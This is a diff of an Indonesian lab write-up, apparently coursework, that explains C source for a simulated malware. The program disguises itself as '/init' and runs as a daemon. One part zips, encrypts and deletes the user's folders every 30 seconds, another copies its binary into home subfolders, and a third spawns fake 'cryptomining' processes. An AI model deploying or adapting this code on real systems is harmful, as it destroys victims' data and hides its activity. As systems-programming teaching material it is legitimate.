@@ -357,8 +357,8 @@ A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyem
         chdir(cwd);
         prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
 ```
-- `if (argc > 0 && strcmp(argv[0], "init") == 0)`: Mengecek apakah argumen pertama (argv[0], yaitu nama program) adalah "init"—artinya program dipanggil dengan nama penyamaran /init.
-- `daemonize();`: Mengubah proses menjadi daemon (background process) agar berjalan terus-menerus di latar belakang, tanpa terminal.
+- `if (argc > 0 && strcmp(argv[0], "init") == 0)`: Mengecek apakah argumen pertama (argv[0], yaitu nama program) adalah "init".
+- `daemonize();`: Mengubah proses menjadi daemon (background process).
 - `chdir(cwd);`: Berpindah ke direktori kerja (cwd) yang sebelumnya sudah ditentukan agar daemon tahu lokasi kerjanya.
 - `prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);`: Mengatur nama proses di sistem menjadi "/init" untuk menyamarkan diri seolah proses sistem utama.
 
@@ -538,6 +538,317 @@ void zip_and_encrypt() {
 - `if (!dir) { perror("Gagal buka direktori"); return; }`: Jika gagal membuka direktori, tampilkan pesan error ke stderr dan hentikan fungsi.
 - `readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1); exe_path[sizeof(exe_path) - 1] = '\0';`: Ambil path lengkap dari executable saat ini, lalu akhiri string dengan null terminator agar valid sebagai string.
 - `pid_t zip_pids[1024]; char folders_to_delete[1024][256]; int pid_index = 0; int folder_index = 0;`: Array untuk menyimpan PID dari proses zip, nama folder yang nanti akan dihapus, dan indeksnya masing-masing.
+- `while ((entry = readdir(dir)) != NULL) {...}`: Loop untuk membaca isi direktori satu per satu.
+- `if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Lewati entri `.` dan `..` karena itu hanya pointer ke direktori saat ini dan induk.
+- `if (stat(entry->d_name, &st) == -1) continue;`: Ambil informasi file. Jika gagal, lanjut ke entri berikutnya.
+- `if (S_ISDIR(st.st_mode)) { ... }`: Jika entri adalah folder, maka:
+    - `snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);`: Buat nama zip berdasarkan nama folder.
+    - `pid_t pid = fork();`: Buat proses anak baru untuk melakukan zip.
+    - `if (pid == 0) { char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL}; execvp("zip", argv); ... }`: Di proses anak, jalankan perintah zip -r nama.zip folder menggunakan execvp.
+    - `else if (pid > 0) { zip_pids[pid_index++] = pid; strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0])); }`: Di proses induk, simpan PID proses zip dan nama folder untuk dihapus nanti.
+- `closedir(dir);`: Tutup direktori setelah semua entri selesai diproses.
+- `for (int i = 0; i < pid_index; i++) { ... }`: Tunggu semua proses zip selesai.
+    - `waitpid(zip_pids[i], &status, 0);`: Tunggu proses dengan PID terkait.
+    - `if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {...}`: Jika proses exit dengan status gagal, tampilkan pesan error.
+- `encrypt_all_files(".", exe_path);`: Enkripsi semua file reguler dalam direktori dan subdirektori, kecuali executable itu sendiri.
+- `printf("Enkripsi selesai.\n");`: Tampilkan bahwa enkripsi telah selesai.
+- `for (int i = 0; i < folder_index; i++) { delete_directory(folders_to_delete[i]); printf("Folder %s dihapus.\n", folders_to_delete[i]); }`: Hapus folder-folder yang sudah dizip dan dienkripsi.
+
+```bash
+void wannacryptor() {
+    FILE *log = fopen("/tmp/wannalog.txt", "a+");
+    if (!log) exit(1);
+
+    while (1) {
+        zip_and_encrypt();
+
+        fprintf(log, "[wannacryptor] Enkripsi dijalankan.\n");
+        fflush(log);
+
+        sleep(30);
+    }
+}
+```
+- `FILE *log = fopen("/tmp/wannalog.txt", "a+");`: Buka file log di /tmp dalam mode append agar bisa mencatat aktivitas.
+- `if (!log) exit(1);`: Jika gagal membuka log, keluar dari program.
+- `while (1) { ... }`: Infinite loop.
+    - `zip_and_encrypt();`: Jalankan proses zip dan enkripsi.
+    - `fprintf(log, "[wannacryptor] Enkripsi dijalankan.\n"); fflush(log);`: Catat ke dalam log bahwa proses enkripsi telah dilakukan.
+    - `sleep(30);`: Tunggu selama 30 detik sebelum mengulang proses.
+ 
+C. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.
+
+```bash
+void run_trojan() {
+    const char *source = "/proc/self/exe";
+    const char *runme_name = "runme";
+    const char *target_base = "/home/rozak";
+
+    DIR *dir = opendir(target_base);
+    if (!dir) {
+        perror("Gagal buka direktori target");
+        exit(1);
+    }
+
+    struct dirent *entry;
+    char dest_path[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        char folder_path[1024];
+        snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);
+
+        struct stat st;
+        if (stat(folder_path, &st) == -1 || !S_ISDIR(st.st_mode))
+            continue;
+
+        snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);
+
+        FILE *src = fopen(source, "rb");
+        FILE *dst = fopen(dest_path, "wb");
+
+        if (!src || !dst) {
+            perror("Gagal copy file runme");
+            if (src) fclose(src);
+            if (dst) fclose(dst);
+            continue;
+        }
+
+        int ch;
+        while ((ch = fgetc(src)) != EOF)
+            fputc(ch, dst);
+
+        fclose(src);
+        fclose(dst);
+
+        chmod(dest_path, 600);
+
+        printf("Berhasil copy ke %s\n", dest_path);
+    }
+
+    closedir(dir);
+
+    while (1) {
+        sleep(5);
+    }
+}
+```
+- `const char *source = "/proc/self/exe";`: Menunjuk ke executable program itu sendiri menggunakan link spesial Linux /proc/self/exe.
+- `const char *runme_name = "runme";`: Nama file target yang akan disalin ke folder-folder tujuan, diberi nama runme.
+- `const char *target_base = "/home/rozak";`: Direktori utama target propagasi, tempat di mana trojan akan menyebarkan salinannya ke semua subfolder.
+- `DIR *dir = opendir(target_base);`: Membuka direktori /home/rozak untuk membaca isinya.
+- `if (!dir) { perror("Gagal buka direktori target"); exit(1); }`: Jika gagal membuka direktori target, tampilkan pesan kesalahan dan keluar dari program.
+- `while ((entry = readdir(dir)) != NULL) { ... }`: Iterasi seluruh isi dari direktori `/home/rozak`.
+- `if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Lewati entri khusus `.` dan `...`
+- `snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);`: Bangun path lengkap ke subfolder seperti /home/rozak/user1, /home/rozak/user2, dll.
+- `if (stat(folder_path, &st) == -1 || !S_ISDIR(st.st_mode)) continue;`: Cek apakah path tersebut benar-benar folder. Kalau bukan folder atau gagal diakses, lewati.
+- `snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);`: Tentukan path file tujuan, misalnya /home/rozak/user1/runme.
+- `FILE *src = fopen(source, "rb"); FILE *dst = fopen(dest_path, "wb");`: Buka file sumber (executable program sendiri) untuk dibaca dalam mode biner, dan buka file tujuan untuk ditulis dalam mode biner.
+- `if (!src || !dst) { perror("Gagal copy file runme"); ... continue; }`: Jika salah satu file gagal dibuka, cetak error, tutup yang sempat dibuka, dan lanjut ke folder berikutnya.
+- `int ch; while ((ch = fgetc(src)) != EOF) fputc(ch, dst);`: Salin isi file byte per byte dari src ke dst.
+- `fclose(src); fclose(dst);`: Tutup kedua file setelah penyalinan selesai.
+- `chmod(dest_path, 600);`: Ubah permission file hasil salinan menjadi hanya bisa dibaca dan ditulis oleh user (read-write, no execute).
+- `printf("Berhasil copy ke %s\n", dest_path);`: Tampilkan pesan sukses copy ke folder target.
+- `closedir(dir);`: Tutup direktori setelah semua folder selesai diproses.
+- `while (1) { sleep(5); }`: Loop selamanya dengan delay 5 detik utnuk mempertahankan proses tetap berjalan agar tidak langsung keluar.
+
+D. Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik.
+
+```bash
+int main(int argc, char *argv[]) {
+    ...
+    if (argc > 0 && strcmp(argv[0], "init") == 0) {
+        daemonize();
+        chdir(cwd);
+        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
+
+        while (1) {
+            pid_t pid = fork();
+            if (pid == 0) {
+                char *args[] = {"wannacryptor", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv wannacryptor gagal");
+                exit(1);
+            }
+        
+            pid_t pid2 = fork();
+            if (pid2 == 0) {
+                char *args[] = {"trojan.wrm", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv trojan.wrm gagal");
+                exit(1);
+            }
+
+            pid_t pid3 = fork();
+            if (pid3 == 0) {
+                char *args[] = {"rodok.exe", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv rodok.exe gagal");
+                exit(1);
+            }
+            
+            int status;
+            waitpid(-1, &status, WNOHANG);
+
+            sleep(30);
+        }
+    ....
+}
+```
+- `sleep(30);`: menjalankan fitur pertama dan fitur kedua setiap 30 detik.
+
+E. Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.
+F. Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)
+G. Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log dengan format: `[YYYY-MM-DD hh:mm:ss][Miner XX] hash` Dimana XX adalah ID mine-crafter yang membuat hash tersebut.
+H. Karena mine-crafter-XX adalah anak dari rodok.exe, saat rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati.
+
+```bash
+void rodok_launcher() {
+    srand(time(NULL));
+    setpgid(0, 0);
+
+    signal(SIGTERM, sigterm_handler_rodok);
+
+    for (int miner_id = 0; miner_id < 3; miner_id++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            char name[32];
+            snprintf(name, sizeof(name), "mine-crafter-%02d", miner_id);
+
+            setpgid(0, 0);
+
+            char *args[] = {name, " ", NULL};
+            execv("/proc/self/exe", args);
+            perror("execv miner gagal");
+            exit(1);
+        } else if (pid > 0) {
+            children[miner_id] = pid;
+        }
+    }
+
+    int status;
+    while (wait(&status) > 0);
+}
+```
+- `srand(time(NULL));`: Inisialisasi random seed (meski belum digunakan di sini).
+- `setpgid(0, 0);`: Buat process group baru.
+- `signal(SIGTERM, sigterm_handler_rodok);`: Tangani sinyal SIGTERM agar bisa kill semua anak saat dimatikan.
+- `for (int miner_id = 0; miner_id < 3; miner_id++)`: Loop untuk buat 3 child process.
+- `fork()`: Buat proses baru.
+- `if (pid == 0)`: Jika proses anak, lakukan
+    - `snprintf(name, ...)`: Format nama proses jadi mine-crafter-XX.
+    - `execv("/proc/self/exe", args);`: Jalankan ulang diri sendiri dengan nama proses baru.
+- `else if (pid > 0)`: Di proses induk, simpan PID anak ke array.
+- `while (wait(&status) > 0);`: Tunggu semua proses anak selesai.
+
+```bash
+void daemonize() {
+    pid_t pid = fork();
+    if (pid < 0) exit(1);
+    if (pid > 0) exit(0);
+
+    umask(0);
+    setsid();
+
+    pid = fork();
+    if (pid < 0) exit(1);
+    if (pid > 0) exit(0);
+
+    chdir("/");
+
+    for (int i = sysconf(_SC_OPEN_MAX); i >= 0; i--) close(i);
+    open("/dev/null", O_RDONLY);
+    open("/dev/null", O_WRONLY);
+    open("/dev/null", O_RDWR);
+}
+```
+- `pid_t pid = fork();`: Buat proses baru. Jika parent, keluar.
+- `umask(0);`: Reset file permission mask.
+- `setsid();`: Buat sesi baru, jadi leader tanpa terminal.
+- `fork()`: Lepaskan diri dari sesi agar tidak jadi session leader.
+- `chdir("/");`: Pindah ke root directory.
+- `close(i)`: Tutup semua file descriptor terbuka.
+- `open("/dev/null", ...)`: Arahkan stdin, stdout, stderr ke /dev/null.
+
+```bash
+int main(int argc, char *argv[]) {
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+
+    if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
+            rodok_launcher();
+        return 0;
+    }
+
+    if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
+            wannacryptor();
+        return 0;
+    }
+    
+    if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
+            run_trojan();
+        return 0;
+    }
+    
+    if (argc > 0 && strcmp(argv[0], "init") == 0) {
+        daemonize();
+        chdir(cwd);
+        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
+
+        while (1) {
+            pid_t pid = fork();
+            if (pid == 0) {
+                char *args[] = {"wannacryptor", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv wannacryptor gagal");
+                exit(1);
+            }
+        
+            pid_t pid2 = fork();
+            if (pid2 == 0) {
+                char *args[] = {"trojan.wrm", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv trojan.wrm gagal");
+                exit(1);
+            }
+
+            pid_t pid3 = fork();
+            if (pid3 == 0) {
+                char *args[] = {"rodok.exe", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv rodok.exe gagal");
+                exit(1);
+            }
+            
+            int status;
+            waitpid(-1, &status, WNOHANG);
+
+            sleep(30);
+        }
+    }
+
+    char *newargv[] = { "init", NULL};
+    execv("/proc/self/exe", newargv);
+    perror("execv init gagal");
+    exit(1);
+}
+```
+- `getcwd(cwd, sizeof(cwd));`: Mendapatkan direktori kerja saat ini dan menyimpannya dalam variabel cwd. Ini berguna jika perlu mengubah direktori kerja atau kembali ke direktori sebelumnya.
+- `if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) { rodok_launcher(); }`: Jika program dijalankan dengan argumen "rodok.exe", maka menjalankan rodok_launcher().
+- `if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) { wannacryptor(); }`: Jika argumen pertama adalah "wannacryptor", maka menjalankan wannacryptor().
+- `if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) { run_trojan(); }`: Jika argumen pertama adalah "trojan.wrm", maka menjalankan run_trojan().
+- `if (argc > 0 && strcmp(argv[0], "init") == 0) { daemonize(); chdir(cwd); prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0); ... }`: Jika argumen pertama adalah "init", maka:
+    - Memulai daemon dengan `daemonize()` untuk membuat proses berjalan di background.
+    - Mengembalikan direktori kerja ke yang semula (`chdir(cwd)`).
+    - Menetapkan nama proses menjadi "/init".
+    - Membuat tiga fork untuk menjalankan `wannacryptor`, `trojan.wrm`, dan `rodok.exe`, masing-masing berjalan sebagai proses terpisah.
+    - Proses utama menunggu setiap 30 detik dan menunggu status proses yang selesai dengan `waitpid()`.
+- `char *newargv[] = { "init", NULL}; execv("/proc/self/exe", newargv);`: Membuat proses baru dengan menjalankannya dengan argumen "init" yang kemudian akan menjalankan proses `wannacryptor`, `trojan.wrm`, dan `rodok.exe` dalam fork terpisah (Memastikan 3 proses tersebut berjalan secara terpisah).
 
 ## Soal 4
 
